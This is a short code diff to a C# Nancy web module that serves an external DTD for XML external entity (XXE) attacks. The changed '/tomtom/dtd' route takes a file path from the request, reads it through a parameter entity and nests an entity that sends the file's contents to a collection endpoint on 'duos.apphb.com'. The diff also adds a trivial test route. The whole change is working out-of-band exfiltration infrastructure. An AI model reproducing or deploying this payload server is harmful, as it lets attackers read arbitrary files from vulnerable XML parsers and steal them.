@@ -46,10 +46,15 @@ namespace DuosWeb
                 Data.Clear();
                 return "cleared";
             };
+            Get["/tomtom/test"] = _ =>
+            {
+                return "test file content";
+            };
 
             Get["/tomtom/dtd"] = _ =>
             {
-                return Response.AsText("<!ENTITY %getthegoodstuff \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?q=%pwd;'>\"> %getthegoodstuff;").WithContentType("application/xml");
+                string path = _.path;
+                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add?q=%data;'>\">").WithContentType("application/xml");
             };
         }
 
